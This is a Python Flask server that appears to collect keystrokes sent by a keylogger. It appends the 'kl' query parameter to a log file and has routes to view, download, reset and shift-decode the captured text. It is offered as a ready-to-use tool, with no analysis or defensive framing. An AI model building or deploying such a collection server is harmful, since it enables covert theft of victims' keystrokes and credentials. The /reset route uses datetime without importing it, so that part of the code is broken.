from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Ruta al archivo de texto para almacenar los textos
archivo_texto = 'log_kl.txt'


def descifrar_desplazamiento(texto_cifrado, desplazamiento):
    texto_descifrado = ""
    for caracter in texto_cifrado:
        # Restamos el desplazamiento para descifrar
        texto_descifrado += chr(ord(caracter) - desplazamiento)
    return texto_descifrado

@app.route('/', methods=['GET'])
def index():
    texto_recibido = request.args.get('kl', '')
    with open(archivo_texto, 'a') as file:
        caracteres_escritos = file.write(texto_recibido)
        if caracteres_escritos > 0:
            return f"Escritura exitosa. {caracteres_escritos} caracteres fueron escritos en el archivo."
        else:
            return "No se pudo escribir en el archivo."

@app.route('/reset', methods=['GET'])
def reset():
    try:
        with open(archivo_texto, 'w') as file:
            file.write(f'Reset realizado el {datetime.datetime.now()}')
        return "El archivo ha sido reiniciado."
    except Exception as e:
        return f"Error al reiniciar el archivo: {str(e)}"

@app.route('/desc', methods=['GET'])
def descifrar():
    try:
        if os.path.exists(archivo_texto):
            with open(archivo_texto, 'r') as file:
                contenido_cifrado = file.read()
            desplazamiento = 3  # Puedes ajustar el desplazamiento según tus necesidades
            contenido_descifrado = descifrar_desplazamiento(contenido_cifrado, desplazamiento)
            return contenido_descifrado
        else:
            return "El archivo de texto no existe."
    except Exception as e:
        return f"Error al descifrar el archivo: {str(e)}"

@app.route('/listado.txt', methods=['GET'])
@app.route('/listado.txt', methods=['POST'])
@app.route('/v', methods=['GET'])
def view():
    try:
        if os.path.exists(archivo_texto):
            with open(archivo_texto, 'r') as file:
                contenido = file.read()
            return contenido
        else:
            return "El archivo de texto no existe."
    except Exception as e:
        return f"Error al leer el archivo: {str(e)}"

@app.route('/d', methods=['GET'])
def download():
    try:
        if os.path.exists(archivo_texto):
            return send_file(archivo_texto, as_attachment=True)
        else:
            return "El archivo de texto no existe."
    except Exception as e:
        return f"Error al descargar el archivo: {str(e)}"

if __name__ == '__main__':
    app.run(debug=True, port=os.getenv("PORT", default=5000))


